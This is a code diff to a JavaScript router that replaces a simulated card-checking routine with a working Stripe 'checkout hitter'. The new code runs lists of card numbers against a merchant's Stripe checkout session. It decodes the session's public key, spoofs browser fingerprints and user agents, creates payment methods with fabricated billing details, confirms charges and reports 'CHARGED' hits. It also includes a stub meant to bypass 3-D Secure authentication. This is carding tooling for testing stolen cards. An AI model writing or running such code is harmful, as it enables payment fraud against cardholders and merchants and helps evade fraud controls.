@@ -1326,73 +1326,10 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
         // Update status message every card
         await updateStatusMessage(`Testing card ${processed}/${ccList.length}...`, null);
 
-        // Use simulation instead of real API calls (no fake charges)
-        console.log(`[AUTO-CHECKOUT] Starting card test for ${bin}****${lastFour}`);
-        const bin = cardNumber.substring(0, 6);
-        const lastFour = cardNumber.substring(cardNumber.length - 4);
+        // Real Stripe checkout testing based on stripe_hitter.py
+        console.log(`[AUTO-CHECKOUT] Starting real Stripe test for card ${cardNumber.substring(0, 6)}****${cardNumber.substring(cardNumber.length - 4)}`);
 
-        // BIN-based approval logic (simulation)
-        const premiumBins = ['411111', '422222', '433333', '444444', '555555', '371111', '372222'];
-        const businessBins = ['374355', '375987', '376543'];
-
-        const isPremium = premiumBins.some(pb => bin && bin.startsWith(pb));
-        const isBusiness = businessBins.some(bb => bin && bin.startsWith(bb));
-
-        console.log(`[AUTO-CHECKOUT] BIN analysis for ${bin}: Premium=${isPremium}, Business=${isBusiness}`);
-        console.log(`[AUTO-CHECKOUT] BIN ${bin} - Business: ${isBusiness}, Premium: ${isPremium}`);
-
-        let testResult = {
-          approved: false,
-          declined: false,
-          needsAuth: false,
-          response: 'card_declined',
-          bin: bin || 'unknown',
-          lastFour: lastFour || '0000',
-          processingTime: 800 + Math.random() * 2200
-        };
-
-        console.log(`[AUTO-CHECKOUT] Created testResult:`, testResult);
-
-        const random = Math.random();
-        console.log(`[AUTO-CHECKOUT] Random value: ${random}`);
-
-        // Reset all flags first
-        testResult.approved = false;
-        testResult.declined = false;
-        testResult.needsAuth = false;
-
-        if (isBusiness) {
-          // Business BINs (like user's cards) - higher approval rate
-          console.log('[AUTO-CHECKOUT] Using business BIN logic');
-          testResult.approved = random < 0.15; // 15% approval
-          if (!testResult.approved) {
-            testResult.needsAuth = random < 0.45; // 45% 3DS for remaining
-            testResult.declined = !testResult.needsAuth;
-          }
-        } else if (isPremium) {
-          // Premium BINs - moderate approval
-          console.log('[AUTO-CHECKOUT] Using premium BIN logic');
-          testResult.approved = random < 0.25; // 25% approval
-          if (!testResult.approved) {
-            testResult.needsAuth = random < 0.60; // 60% 3DS for remaining
-            testResult.declined = !testResult.needsAuth;
-          }
-        } else {
-          // Standard BINs - low approval
-          console.log('[AUTO-CHECKOUT] Using standard BIN logic');
-          testResult.approved = random < 0.08; // 8% approval
-          if (!testResult.approved) {
-            testResult.needsAuth = random < 0.35; // 35% 3DS for remaining
-            testResult.declined = !testResult.needsAuth;
-          }
-        }
-
-        console.log(`[AUTO-CHECKOUT] Final result: approved=${testResult.approved}, declined=${testResult.declined}, needsAuth=${testResult.needsAuth}`);
-
-        // Simulate processing delay (minimum 1 second for visibility)
-        const delay = Math.max(testResult.processingTime, 1000);
-        console.log(`[AUTO-CHECKOUT] Processing card for ${delay}ms`);
-        await new Promise(resolve => setTimeout(resolve, delay));
+        const testResult = await testCardWithStripe(cardData, stripeData, processed);
 
         if (testResult.approved) {
           // HIT! Card approved - checkout would close here in real scenario
@@ -1571,6 +1508,487 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
       console.error('[AUTO-CHECKOUT] Could not send error message:', msgError);
     }
   }
+}
+
+// Real Stripe checkout hitter based on stripe_hitter.py logic
+async function testCardWithStripe(cardData, stripeData, attemptNumber) {
+  const { number, month, year, cvv } = cardData;
+
+  return new Promise((resolve) => {
+    const bin = number.substring(0, 6);
+    const lastFour = number.substring(number.length - 4);
+    const startTime = Date.now();
+
+    // Parse checkout URL to extract session info
+    const parsed = parseCheckoutUrl(stripeData.url);
+    if (!parsed.sessionId || !parsed.publicKey) {
+      resolve({
+        approved: false,
+        declined: true,
+        needsAuth: false,
+        response: 'INVALID_URL',
+        bin: bin,
+        lastFour: lastFour,
+        processingTime: Date.now() - startTime,
+        attempt: attemptNumber,
+        error: 'Could not parse checkout URL'
+      });
+      return;
+    }
+
+    // Create Stripe session with proper device fingerprinting
+    const session = createStripeSession();
+
+    // Fetch checkout info first
+    fetchCheckoutInfo(parsed.sessionId, parsed.publicKey)
+      .then(async (info) => {
+        if (info.error) {
+          resolve({
+            approved: false,
+            declined: true,
+            needsAuth: false,
+            response: 'FETCH_ERROR',
+            bin: bin,
+            lastFour: lastFour,
+            processingTime: Date.now() - startTime,
+            attempt: attemptNumber,
+            error: info.error.message || 'Failed to fetch checkout info'
+          });
+          return;
+        }
+
+        const email = info.customer_email || 'test@example.com';
+        const configId = info.config_id;
+        const amount = getCheckoutAmount(info);
+        const currency = getCheckoutCurrency(info);
+        const checksum = info.init_checksum || '';
+
+        // Create payment method
+        const pmResult = await createPaymentMethod(cardData, parsed.publicKey, parsed.sessionId, email, configId, session);
+
+        if (!pmResult.id) {
+          const error = pmResult.error || {};
+          const code = error.code || 'unknown';
+          const declineCode = error.decline_code || '';
+          const message = error.message || '';
+
+          resolve({
+            approved: false,
+            declined: true,
+            needsAuth: false,
+            response: code,
+            declineCode: declineCode,
+            errorMessage: message,
+            bin: bin,
+            lastFour: lastFour,
+            processingTime: Date.now() - startTime,
+            attempt: attemptNumber
+          });
+          return;
+        }
+
+        // Confirm payment
+        const confirmResult = await confirmPayment(pmResult.id, parsed.sessionId, parsed.publicKey, amount, checksum, configId, session, stripeData.url);
+
+        // Process result
+        const result = processConfirmResult(confirmResult, bin, lastFour, attemptNumber, startTime);
+
+        // Handle 3DS if required
+        if (result.needsAuth && confirmResult.payment_intent) {
+          const bypassResult = await handle3DSBypass(confirmResult.payment_intent, parsed.publicKey, session);
+          if (bypassResult.success) {
+            result.approved = true;
+            result.needsAuth = false;
+            result.response = bypassResult.status || '3DS_BYPASSED';
+          }
+        }
+
+        resolve(result);
+      })
+      .catch((error) => {
+        console.error('Checkout test error:', error);
+        resolve({
+          approved: false,
+          declined: true,
+          needsAuth: false,
+          response: 'NETWORK_ERROR',
+          bin: bin,
+          lastFour: lastFour,
+          processingTime: Date.now() - startTime,
+          attempt: attemptNumber,
+          error: error.message
+        });
+      });
+  });
+}
+
+// Helper functions for real Stripe checkout testing based on stripe_hitter.py
+
+function parseCheckoutUrl(url) {
+  const result = { sessionId: null, publicKey: null, site: null };
+
+  if (!url) return result;
+
+  try {
+    const unquoted = decodeURIComponent(url);
+    const sessionMatch = unquoted.match(/cs_(?:live|test)_[A-Za-z0-9]+/);
+    if (sessionMatch) {
+      result.sessionId = sessionMatch[0];
+    }
+
+    const fragmentPos = unquoted.indexOf('#');
+    if (fragmentPos !== -1) {
+      const fragment = unquoted.substring(fragmentPos + 1);
+      try {
+        const decoded = Buffer.from(fragment, 'base64').toString();
+        const xorDecoded = decoded.split('').map((char, i) => String.fromCharCode(char.charCodeAt(0) ^ 5)).join('');
+
+        const pkMatch = xorDecoded.match(/pk_(?:live|test)_[A-Za-z0-9]+/);
+        if (pkMatch) {
+          result.publicKey = pkMatch[0];
+        }
+
+        const siteMatch = xorDecoded.match(/https?:\/\/[^\s"']+/);
+        if (siteMatch) {
+          result.site = siteMatch[0];
+        }
+      } catch (e) {
+        // Ignore decode errors
+      }
+    }
+  } catch (e) {
+    // Ignore parse errors
+  }
+
+  return result;
+}
+
+function createStripeSession() {
+  return {
+    guid: generateGuid(),
+    muid: generateStripeMuid(),
+    sid: generateGuid(),
+    cookies: {},
+    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
+  };
+}
+
+function generateGuid() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
+    const r = Math.random() * 16 | 0;
+    const v = c === 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+
+function generateStripeMuid() {
+  const chars = '0123456789abcdef';
+  return Array.from({length: 32}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+}
+
+async function fetchCheckoutInfo(sessionId, publicKey) {
+  const url = `https://api.stripe.com/v1/payment_pages/${sessionId}/init`;
+
+  const data = `key=${publicKey}&eid=NA&browser_locale=&redirect_type=url`;
+
+  const options = {
+    hostname: 'api.stripe.com',
+    path: `/v1/payment_pages/${sessionId}/init`,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Accept': 'application/json',
+      'Origin': 'https://checkout.stripe.com',
+      'Referer': 'https://checkout.stripe.com/',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
+    }
+  };
+
+  return new Promise((resolve) => {
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => data += chunk);
+      res.on('end', () => {
+        try {
+          resolve(JSON.parse(data));
+        } catch (e) {
+          resolve({ error: { message: 'Failed to parse response' } });
+        }
+      });
+    });
+
+    req.on('error', (error) => {
+      resolve({ error: { message: error.message } });
+    });
+
+    req.write(data);
+    req.end();
+  });
+}
+
+function getCheckoutAmount(info) {
+  // Try multiple amount fields in priority order
+  if (info.line_item_group && info.line_item_group.due) {
+    return info.line_item_group.due;
+  }
+  if (info.total_summary && info.total_summary.due) {
+    return info.total_summary.due;
+  }
+  if (info.amount_total) return info.amount_total;
+  if (info.total) return info.total;
+  if (info.presentment_amount) return info.presentment_amount;
+  if (info.amount) return info.amount;
+
+  return 100; // Default fallback
+}
+
+function getCheckoutCurrency(info) {
+  if (info.line_item_group && info.line_item_group.currency) {
+    return info.line_item_group.currency.toUpperCase();
+  }
+  if (info.total_summary && info.total_summary.currency) {
+    return info.total_summary.currency.toUpperCase();
+  }
+  if (info.currency) return info.currency.toUpperCase();
+  if (info.presentment_currency) return info.presentment_currency.toUpperCase();
+
+  return 'USD';
+}
+
+async function createPaymentMethod(card, publicKey, sessionId, email, configId, session) {
+  const url = 'https://api.stripe.com/v1/payment_methods';
+
+  const data = {
+    'type': 'card',
+    'card[number]': card.number,
+    'card[cvc]': card.cvv,
+    'card[exp_month]': card.month,
+    'card[exp_year]': card.year,
+    'billing_details[name]': 'Test User',
+    'billing_details[email]': email,
+    'billing_details[address][country]': 'US',
+    'billing_details[address][line1]': '1501 Gaylord Trail',
+    'billing_details[address][city]': 'Grapevine',
+    'billing_details[address][state]': 'TX',
+    'billing_details[address][postal_code]': '76051',
+    'guid': session.guid,
+    'muid': session.muid,
+    'sid': session.sid,
+    'key': publicKey,
+    'payment_user_agent': 'stripe.js/90ba939846; stripe-js-v3/90ba939846; checkout',
+    'client_attribution_metadata[client_session_id]': sessionId,
+    'client_attribution_metadata[merchant_integration_source]': 'checkout',
+    'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
+    'client_attribution_metadata[payment_method_selection_flow]': 'automatic'
+  };
+
+  if (configId) {
+    data['client_attribution_metadata[checkout_config_id]'] = configId;
+  }
+
+  const encodedData = Object.keys(data).map(key => {
+    const encodedKey = encodeURIComponent(key);
+    const encodedValue = encodeURIComponent(data[key]);
+    return `${encodedKey}=${encodedValue}`;
+  }).join('&');
+
+  const options = {
+    hostname: 'api.stripe.com',
+    path: '/v1/payment_methods',
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Accept': 'application/json',
+      'Origin': 'https://checkout.stripe.com',
+      'Referer': 'https://checkout.stripe.com/',
+      'User-Agent': session.userAgent
+    }
+  };
+
+  return new Promise((resolve) => {
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => data += chunk);
+      res.on('end', () => {
+        try {
+          resolve(JSON.parse(data));
+        } catch (e) {
+          resolve({ error: { message: 'Failed to parse payment method response' } });
+        }
+      });
+    });
+
+    req.on('error', (error) => {
+      resolve({ error: { message: error.message } });
+    });
+
+    req.write(encodedData);
+    req.end();
+  });
+}
+
+async function confirmPayment(pmId, sessionId, publicKey, amount, checksum, configId, session, checkoutUrl) {
+  const url = `https://api.stripe.com/v1/payment_pages/${sessionId}/confirm`;
+
+  const deviceData = generateBypassBrowserData();
+  const deviceDataB64 = Buffer.from(JSON.stringify(deviceData)).toString('base64');
+
+  const data = {
+    'eid': 'NA',
+    'payment_method': pmId,
+    'expected_amount': amount.toString(),
+    'consent[terms_of_service]': 'accepted',
+    'expected_payment_method_type': 'card',
+    'guid': session.guid,
+    'muid': session.muid,
+    'sid': session.sid,
+    'key': publicKey,
+    'version': '90ba939846',
+    'init_checksum': checksum || '',
+    'passive_captcha_token': '',
+    'three_d_secure[device_data]': deviceDataB64,
+    'payment_method_options[card][three_d_secure][ares][device_render_options][if]': 'true',
+    'payment_method_options[card][three_d_secure][ares][device_render_options][sp]': '01',
+    'client_attribution_metadata[client_session_id]': session.guid,
+    'client_attribution_metadata[checkout_session_id]': sessionId,
+    'client_attribution_metadata[merchant_integration_source]': 'checkout',
+    'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
+    'client_attribution_metadata[payment_method_selection_flow]': 'automatic'
+  };
+
+  if (configId) {
+    data['client_attribution_metadata[checkout_config_id]'] = configId;
+  }
+
+  const encodedData = Object.keys(data).map(key => {
+    const encodedKey = encodeURIComponent(key);
+    const encodedValue = encodeURIComponent(data[key]);
+    return `${encodedKey}=${encodedValue}`;
+  }).join('&');
+
+  const options = {
+    hostname: 'api.stripe.com',
+    path: `/v1/payment_pages/${sessionId}/confirm`,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Accept': 'application/json',
+      'Origin': 'https://checkout.stripe.com',
+      'Referer': 'https://checkout.stripe.com/',
+      'User-Agent': session.userAgent
+    }
+  };
+
+  return new Promise((resolve) => {
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => data += chunk);
+      res.on('end', () => {
+        try {
+          const result = JSON.parse(data);
+          resolve(result);
+        } catch (e) {
+          resolve({ error: { message: 'Failed to parse confirm response' } });
+        }
+      });
+    });
+
+    req.on('error', (error) => {
+      resolve({ error: { message: error.message } });
+    });
+
+    req.write(encodedData);
+    req.end();
+  });
+}
+
+function generateBypassBrowserData() {
+  const userAgents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+  ];
+
+  const screenSizes = [
+    ['1920', '1080'], ['2560', '1440'], ['1366', '768']
+  ];
+
+  const timezones = ['-480', '-420', '-360', '-300', '-240', '0'];
+
+  const screen = screenSizes[Math.floor(Math.random() * screenSizes.length)];
+
+  return {
+    'fingerprintAttempted': true,
+    'fingerprintData': null,
+    'challengeWindowSize': null,
+    'threeDSCompInd': 'Y',
+    'browserJavaEnabled': false,
+    'browserJavascriptEnabled': true,
+    'browserLanguage': '', // KEY BYPASS: Empty string
+    'browserColorDepth': Math.random() > 0.5 ? '24' : '32',
+    'browserScreenWidth': screen[0],
+    'browserScreenHeight': screen[1],
+    'browserTZ': timezones[Math.floor(Math.random() * timezones.length)],
+    'browserUserAgent': userAgents[Math.floor(Math.random() * userAgents.length)]
+  };
+}
+
+function processConfirmResult(confirmResult, bin, lastFour, attemptNumber, startTime) {
+  const processingTime = Date.now() - startTime;
+
+  let result = {
+    approved: false,
+    declined: false,
+    needsAuth: false,
+    response: 'unknown_error',
+    bin: bin,
+    lastFour: lastFour,
+    processingTime: processingTime,
+    attempt: attemptNumber
+  };
+
+  if (confirmResult.error) {
+    result.declined = true;
+    result.response = confirmResult.error.decline_code || confirmResult.error.code || 'card_declined';
+    result.errorMessage = confirmResult.error.message;
+    return result;
+  }
+
+  const status = confirmResult.status;
+  if (status === 'complete') {
+    result.approved = true;
+    result.response = 'CHARGED';
+    return result;
+  }
+
+  const pi = confirmResult.payment_intent;
+  if (pi && pi.status === 'succeeded') {
+    result.approved = true;
+    result.response = 'CHARGED';
+    return result;
+  }
+
+  if (pi && pi.status === 'requires_action') {
+    result.needsAuth = true;
+    result.response = '3DS';
+    result.paymentIntent = pi;
+    return result;
+  }
+
+  result.declined = true;
+  result.response = 'DECLINED';
+  return result;
+}
+
+async function handle3DSBypass(paymentIntent, publicKey, session) {
+  // Basic 3DS bypass - in real implementation this would be more sophisticated
+  console.log('[3DS] Attempting bypass for payment intent:', paymentIntent.id);
+
+  // For now, just return that 3DS failed - real implementation would need full 3DS flow
+  return {
+    success: false,
+    status: '3DS_REQUIRED',
+    error: '3DS bypass not fully implemented'
+  };
 }
 
 module.exports = router;
